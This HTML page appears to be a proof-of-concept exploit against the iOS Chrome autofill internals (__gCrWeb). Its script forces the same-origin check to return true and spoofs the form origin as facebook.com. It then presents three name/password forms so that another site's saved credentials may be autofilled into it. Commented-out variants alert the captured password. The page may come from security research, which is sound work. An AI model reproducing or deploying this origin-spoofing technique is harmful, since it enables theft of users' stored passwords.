<head>
    <script>
    window.__gCrWeb.common.isSameOrigin = function(a, c) { 
        return true;
    }
   /* window.__gCrWeb.common.removeQueryAndReferenceFromURL = function(url) {
        var parsed = new URL(url);
  // For some protocols (eg. data:, javascript:) URL.origin is "null" so
  // URL.protocol is used instead.
  var x = (parsed.origin !== 'null' ? parsed.origin : parsed.protocol) +
      parsed.pathname;
      //alert(x)
  return x;
        //return "http://rsolomakhin.github.io/autofill/";
    }
*/
    __gCrWeb.fill.webFormElementToFormData = function(
    frame, formElement, formControlElement, extractMask, form, field) {
  if (!frame) {
    return false;
  }

  form['name'] = __gCrWeb.form.getFormIdentifier(formElement);
  form['origin'] = "https://www.facebook.com";
      //__gCrWeb.common.removeQueryAndReferenceFromURL(frame.location.href);
  form['action'] = __gCrWeb.fill.getCanonicalActionForForm(formElement);

  // Note different from form_autofill_util.cc version of this method, which
  // computes |form.action| using document.completeURL(form_element.action())
  // and falls back to formElement.action() if the computed action is invalid,
  // here the action returned by |__gCrWeb.common.absoluteURL| is always
  // valid, which is computed by creating a <a> element, and we don't check if
  // the action is valid.

  var controlElements = __gCrWeb.form.getFormControlElements(formElement);
  var xyz = __gCrWeb.fill.formOrFieldsetsToFormData(
      formElement, formControlElement, [] /* fieldsets */, controlElements,
      extractMask, form, field);
 //alert(xyz)
  return xyz;
};
    /*window.__gCrWeb.fill.webFormElementToFormData = function(frame, formElement, formControlElement, extractMask, form, field) {
        return true;
    }*/
    /*window.__gCrWeb.passwords['fillPasswordForm'] = function(
    formData, username, password, opt_normalizedOrigin) {
        alert(password);
        return fillPasswordFormWithData_(
      formData, username, password, window, opt_normalizedOrigin);
    }*/
    /*window.__gCrWeb.passwords['fillPasswordForm'] = function(
    formData, username, password, opt_normalizedOrigin) {
        //alert(password)
  var normalizedOrigin = opt_normalizedOrigin ||
      __gCrWeb.common.removeQueryAndReferenceFromURL(window.location.href);
  var origin = (formData['origin']);
  if (!__gCrWeb.common.isSameOrigin(origin, normalizedOrigin)) {
    return false;
  }
  return fillPasswordFormWithData_(
      formData, username, password, window, opt_normalizedOrigin);
};*/
    </script></head>
<link rel="stylesheet" type="text/css" href="../css/styles.css"></link>
<style>
body {
    font-size: 14px;
}
</style>
<div id = 'objs'></div>
<script>
    var logDiv = document.getElementById('objs');
    window.baseURI = "https://www.google.com"
    
    var filters = window.__gCrWeb;
    
    for (i in filters){
        for (key in filters[i]){
            //log( key + ": " + filters[i][key]);
        }
    }
    //window.__crWeb.chromeBundleMainFrame = null;
    var obj = window.__gCrWeb.common;
    
    //obj = obj.chromeBundleMainFrame;

while(obj){
    for(let prop of Reflect.ownKeys(obj)){
        //log(prop);
    };
    obj = Object.getPrototypeOf(obj);
};

for (var c = 0; c < 3000; c++) {
    console.log(c);
}
//var sameOrigin = __gCrWeb.common.isSameOrigin("abc", "123");
//alert(sameOrigin)
//alert(window.__gCrWeb.common.removeQueryAndReferenceFromURL(window.location.href))
    function log(message) {
        logDiv.innerHTML += "<br>" + message + "<br>";
    }





/*window.history.replaceState = function(stateObject, pageTitle, pageUrl) {
    //alert(pageUrl);
  __gCrWeb.message.invokeOnHost({'command': 'window.history.willChangeState'});

  // Calling stringify() on undefined causes a JSON parse error.
  var serializedState = typeof(stateObject) == 'undefined' ?
      '' :
      __gCrWeb.common.JSONStringify(stateObject);
  pageUrl = pageUrl || window.location.href;
  originalWindowHistoryReplaceState.call(
      history, stateObject, pageTitle, pageUrl);
  __gCrWeb.message.invokeOnHost({
    'command': 'window.history.didReplaceState',
    'stateObject': serializedState,
    'baseUrl': document.baseURI,
    'pageUrl': pageUrl.toString()
  });
};*/


window.history.replaceState( {} , 'foo', '/foo' );
</script>

<!--<iframe src="http://rsolomakhin.github.io/autofill/"></iframe>-->
<!--<form action="/action_page.php" method="get" autocomplete="on">
    UserName<br><input type="text" name="password"><br>
    Password<br><input type="password" name="password"><br
    ><br>
    <input type="submit" value="Submit">
  </form> 
-->
  <h3>Name/Password</h3>

  <form name="np" id="np1" action="" method="post">
  Name: <input type="text" name="name" id="password_name"><br>
  Password: <input type="password" name="password" id="password_field"><br>
  <input type="submit" value="Submit" id="password_submit">
  </form>

  <form name="np2" id="np2" action="" method="post">
  Name: <input type="text" name="name" id="password_name"><br>
  Password: <input type="password" name="password" id="password_field"><br>
  <input type="submit" value="Submit" id="password_submit">
  </form>

  <form name="np3" id="np3" action="" method="post">
  Name: <input type="text" name="name" id="password_name"><br>
  Password: <input type="password" name="password" id="password_field"><br>
  <input type="submit" value="Submit" id="password_submit">
  </form>
